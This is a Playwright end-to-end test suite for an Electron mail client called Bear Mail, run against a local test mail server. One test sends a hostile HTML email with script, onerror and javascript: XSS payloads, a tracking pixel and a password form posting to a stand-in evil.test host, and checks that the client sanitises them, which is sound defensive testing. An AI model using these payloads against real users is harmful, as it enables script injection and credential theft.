import { expect, test, type ElectronApplication, type Page } from '@playwright/test'
import { join } from 'node:path'
import { close, launch } from './helpers'
// eslint-disable-next-line @typescript-eslint/no-require-imports
const { start } = require('../tools/mail-server.cjs')

// Bear Mail against Bear's own local IMAP/SMTP test server.
test.describe.configure({ mode: 'serial' })

// Any free ports, so overlapping test runs never collide.
let IMAP = 0
let SMTP = 0
let server: { imapPort: number; smtpPort: number; deliver: (raw: string, folder?: string) => void; close: () => Promise<void> }
let app: ElectronApplication
let page: Page
let dir: string

test.beforeAll(async () => {
  server = await start({ imapPort: 0, smtpPort: 0, quiet: true })
  ;({ imapPort: IMAP, smtpPort: SMTP } = server)
  ;({ app, page, dir } = await launch())
})

test.afterAll(async () => {
  await close(app)
  await server?.close()
})

const list = () => page.getByRole('list', { name: 'Message list' })
const row = (subject: string | RegExp) => list().getByRole('button', { name: subject })
const body = () => page.frameLocator('iframe[title="Message body"]')

async function fillAccount(password: string) {
  const dialog = page.getByRole('dialog', { name: 'Add an email account' })
  await dialog.getByLabel('Email address').fill('bear@bear.com')
  await dialog.getByLabel('Your name').fill('Bear Tester')
  await dialog.getByLabel('Password').fill(password)
  if (!(await dialog.getByLabel('Incoming (IMAP) server').isVisible())) await dialog.getByRole('button', { name: 'Advanced settings' }).click()
  await dialog.getByLabel('Incoming (IMAP) server').fill('127.0.0.1')
  await dialog.getByLabel('Incoming (IMAP) port').fill(String(IMAP))
  await dialog.getByLabel('Incoming (IMAP) security').selectOption('none')
  await dialog.getByLabel('Outgoing (SMTP) server').fill('127.0.0.1')
  await dialog.getByLabel('Outgoing (SMTP) port').fill(String(SMTP))
  await dialog.getByLabel('Outgoing (SMTP) security').selectOption('none')
  await dialog.getByRole('button', { name: 'Connect' }).click()
  return dialog
}

test('adds an account (rejecting a wrong password first)', async () => {
  await page.getByRole('button', { name: /Mail Email/ }).click()
  await expect(page.getByRole('heading', { name: 'Bear Mail' })).toBeVisible()
  await page.getByRole('button', { name: 'Add an account' }).click()

  const dialog = await fillAccount('wrong')
  await expect(dialog.getByRole('alert')).toContainText('rejected the sign-in')
  await dialog.getByLabel('Password').fill('bear')
  await dialog.getByRole('button', { name: 'Connect' }).click()
  await expect(dialog).toBeHidden()

  const folders = page.getByRole('navigation', { name: 'Folders' })
  await expect(folders.getByRole('button', { name: /Inbox/ })).toContainText('1') // one unread
  for (const f of ['Drafts', 'Sent', 'Archive', 'Junk', 'Trash']) await expect(folders.getByRole('button', { name: f, exact: true })).toBeVisible()
})

test('reads a message and updates the unread count', async () => {
  await row(/Welcome to Bear Mail/).click()
  await expect(page.getByRole('article', { name: 'Message' }).getByRole('heading', { name: 'Welcome to Bear Mail' })).toBeVisible()
  await expect(body().locator('b')).toHaveText('local test mail server')
  await expect(page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: /Inbox/ })).not.toContainText('1')
})

test('composes and sends to itself with an attachment, then receives it', async () => {
  await page.getByRole('button', { name: 'New mail' }).first().click()
  const composer = page.getByRole('region', { name: 'New message' })
  await composer.getByLabel('To', { exact: true }).fill('Bear Tester <bear@bear.com>')
  await composer.getByLabel('Subject').fill('Plans for Friday')
  await composer.locator('.page-doc').click()
  await page.keyboard.type('Lunch at noon?')
  await page.keyboard.press('Control+b')
  await page.keyboard.type(' Bring the slides.')
  const chooser = page.waitForEvent('filechooser')
  await composer.getByRole('button', { name: 'Attach' }).click()
  await (await chooser).setFiles({ name: 'agenda.txt', mimeType: 'text/plain', buffer: Buffer.from('1. food\n2. slides') })
  await expect(composer.getByRole('list', { name: 'Attachments' })).toContainText('agenda.txt')
  await page.screenshot({ path: join(__dirname, 'shots/18-mail-compose.png') })
  await page.keyboard.press('Control+Enter')
  await expect(page.getByRole('status')).toHaveText('Message sent')

  await page.getByRole('button', { name: 'Refresh' }).click()
  await row(/Plans for Friday/).click()
  const message = page.getByRole('article', { name: 'Message' })
  await expect(message).toContainText('Bear Tester <bear@bear.com>')
  await expect(body().locator('strong, b')).toContainText('Bring the slides.')
  await expect(message.getByRole('list', { name: 'Attachments' })).toContainText('agenda.txt')

  // A copy was filed in Sent.
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: 'Sent', exact: true }).click()
  await expect(row(/Plans for Friday/)).toBeVisible()
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: /Inbox/ }).click()
})

test('replies with the original quoted and threaded', async () => {
  await row(/Plans for Friday/).click()
  await expect(page.getByRole('article', { name: 'Message' }).getByRole('heading', { name: 'Plans for Friday' })).toBeVisible()
  await page.getByRole('article', { name: 'Message' }).getByRole('button', { name: 'Reply', exact: true }).click()
  const composer = page.getByRole('region', { name: 'New message' })
  await expect(composer.getByLabel('Subject')).toHaveValue('Re: Plans for Friday')
  await expect(composer.getByLabel('To', { exact: true })).toHaveValue('Bear Tester <bear@bear.com>')
  await expect(composer.locator('.page-doc blockquote')).toContainText('Lunch at noon?')
  await composer.locator('.page-doc p').first().click()
  await page.keyboard.type('Sounds good!')
  await composer.getByRole('button', { name: 'Send' }).click()
  await expect(page.getByRole('status')).toHaveText('Message sent')
  await page.getByRole('button', { name: 'Refresh' }).click()
  await expect(row(/Re: Plans for Friday/)).toBeVisible()
})

test('shows hostile email safely', async () => {
  server.deliver([
    'From: "Mallory" <mallory@evil.test>',
    'To: bear@bear.com',
    'Subject: You won a prize',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=utf-8',
    '',
    '<p id="hello">Click below!</p>',
    '<script>window.top.pwned = true</script>',
    '<img src="x" onerror="window.top.pwned = true">',
    '<img id="tracker" src="https://tracker.evil.test/pixel.gif">',
    '<a id="bad" href="javascript:window.top.pwned=true">claim</a>',
    '<a id="good" href="https://example.com/info">details</a>',
    '<form action="https://evil.test/steal"><input name="password"></form>',
    '<iframe src="https://evil.test"></iframe>'
  ].join('\r\n'))
  await page.getByRole('button', { name: 'Refresh' }).click()
  await row(/You won a prize/).click()
  await expect(body().locator('#hello')).toHaveText('Click below!')
  await expect(body().locator('script, iframe, form, input')).toHaveCount(0)
  await expect(body().locator('img[onerror]')).toHaveCount(0)
  await expect(body().locator('#bad')).not.toHaveAttribute('href')
  await expect(body().locator('#good')).toHaveAttribute('target', '_blank')
  // Remote images are blocked until the user asks for them.
  await expect(body().locator('#tracker')).not.toHaveAttribute('src')
  await expect(page.getByRole('note')).toContainText('Pictures from the internet were blocked')
  expect(await page.evaluate(() => (window as unknown as { pwned?: boolean }).pwned)).toBeUndefined()
  await page.getByRole('button', { name: 'Show pictures' }).click()
  await expect(body().locator('#tracker')).toHaveAttribute('src', 'https://tracker.evil.test/pixel.gif')
  await page.screenshot({ path: join(__dirname, 'shots/19-mail-hostile.png') })
})

test('searches, flags, archives and deletes', async () => {
  await page.getByLabel('Search mail').fill('prize')
  await page.getByLabel('Search mail').press('Enter')
  await expect(list().getByRole('button')).toHaveCount(1)
  await page.getByRole('button', { name: 'Clear search' }).click()

  await row(/You won a prize/).click()
  await page.getByRole('article', { name: 'Message' }).getByRole('button', { name: 'Delete' }).click()
  await expect(row(/You won a prize/)).toHaveCount(0)
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: 'Trash', exact: true }).click()
  await expect(row(/You won a prize/)).toBeVisible()
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: /Inbox/ }).click()

  await row(/Welcome to Bear Mail/).click()
  await page.getByRole('article', { name: 'Message' }).getByRole('button', { name: 'Flag' }).click()
  await expect(row(/Welcome to Bear Mail/).locator('svg.text-red-600')).toBeVisible()
  await page.getByRole('article', { name: 'Message' }).getByRole('button', { name: 'Archive' }).click()
  await expect(row(/Welcome to Bear Mail/)).toHaveCount(0)
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: 'Archive', exact: true }).click()
  await expect(row(/Welcome to Bear Mail/)).toBeVisible()
  await page.screenshot({ path: join(__dirname, 'shots/20-mail.png') })
})

test('keeps an unsent draft across a restart', async () => {
  await page.getByRole('button', { name: 'New mail' }).first().click()
  const composer = page.getByRole('region', { name: 'New message' })
  await composer.getByLabel('To', { exact: true }).fill('later@example.test')
  await composer.getByLabel('Subject').fill('Half-written thought')
  await page.waitForTimeout(800) // drafts save shortly after typing stops
  await close(app)
  ;({ app, page } = await launch(dir))
  await page.getByRole('button', { name: /Mail Email/ }).click()
  await page.getByRole('navigation', { name: 'Folders' }).getByRole('button', { name: /Unsent drafts/ }).click()
  await list().getByRole('button', { name: /Half-written thought/ }).click()
  await expect(page.getByRole('region', { name: 'New message' }).getByLabel('To', { exact: true })).toHaveValue('later@example.test')
  await page.getByRole('region', { name: 'New message' }).getByRole('button', { name: 'Discard' }).click()
})

test('creates a Bear Mail address and emails it', async () => {
  await page.getByRole('button', { name: 'Create a Bear Mail address' }).click()
  const dialog = page.getByRole('dialog', { name: 'Create a Bear Mail address' })
  await dialog.getByLabel('Your name').fill('Sam Bear')
  await dialog.getByLabel('User name').fill('sam..x')
  await dialog.getByRole('button', { name: 'Create address' }).click()
  await expect(dialog).toContainText("can't be next to each other")
  await dialog.getByLabel('User name').fill('Sam')
  await expect(dialog).toContainText('Your address will be sam@bear.com')
  await page.screenshot({ path: join(__dirname, 'shots/21-mail-bear-address.png') })
  await dialog.getByRole('button', { name: 'Create address' }).click()
  await expect(dialog).toBeHidden()
  await expect(page.getByRole('navigation', { name: 'Folders' })).toContainText('sam@bear.com')
  await expect(row(/Welcome to Bear Mail/)).toBeVisible()

  // Mail between Bear Mail addresses is delivered; other services can't be reached yet.
  await page.getByRole('button', { name: 'New mail' }).first().click()
  let composer = page.getByRole('region', { name: 'New message' })
  await composer.getByLabel('To', { exact: true }).fill('sam@bear.com')
  await composer.getByLabel('Subject').fill('Note to self')
  await composer.getByRole('button', { name: 'Send' }).click()
  await expect(page.getByRole('status')).toHaveText('Message sent')
  await page.getByRole('button', { name: 'Refresh' }).click()
  await expect(row(/Note to self/)).toBeVisible()

  await page.getByRole('button', { name: 'New mail' }).first().click()
  composer = page.getByRole('region', { name: 'New message' })
  await composer.getByLabel('To', { exact: true }).fill('friend@gmail.com')
  await composer.getByLabel('Subject').fill('Hello outside')
  await composer.getByRole('button', { name: 'Send' }).click()
  await expect(composer.getByRole('alert')).toContainText("can't send to other email services yet")
  await composer.getByRole('button', { name: 'Discard' }).click()

  // The address and its mail survive a restart.
  await close(app)
  ;({ app, page } = await launch(dir))
  await page.getByRole('button', { name: /Mail Email/ }).click()
  await page.getByRole('navigation', { name: 'Folders' }).getByText('sam@bear.com').click()
  await expect(row(/Note to self/)).toBeVisible()
  await page.screenshot({ path: join(__dirname, 'shots/22-mail-bear-inbox.png') })
})

test('imports another account into a new Bear Mail address', async () => {
  // bear@bear.com is the IMAP account on the test server, standing in for Gmail.
  await page.getByRole('button', { name: 'Options for bear@bear.com' }).click()
  await page.getByRole('menuitem', { name: 'Import into Bear Mail…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Import into Bear Mail' })
  await expect(dialog.getByLabel('Copy mail from')).toHaveValue(/.+/)
  await dialog.getByLabel('New address').fill('moved')
  await dialog.getByLabel('Which mail').selectOption({ label: 'Everything' })
  await page.screenshot({ path: join(__dirname, 'shots/23-mail-import.png') })
  await dialog.getByRole('button', { name: 'Start import' }).click()
  await expect(dialog.getByRole('status')).toContainText('Done', { timeout: 20_000 })
  await expect(dialog.getByRole('list', { name: 'Folders' })).toContainText('Inbox')
  await page.screenshot({ path: join(__dirname, 'shots/24-mail-import-done.png') })
  await dialog.getByRole('button', { name: 'Close' }).click()

  const nav = page.getByRole('navigation', { name: 'Folders' })
  await nav.getByText('moved@bear.com').click()
  await expect(row(/Plans for Friday/).first()).toBeVisible()
  await expect(row(/Re: Plans for Friday/)).toBeVisible()
  await nav.getByRole('button', { name: 'Sent', exact: true }).click()
  await expect(row(/Plans for Friday/).first()).toBeVisible()
})
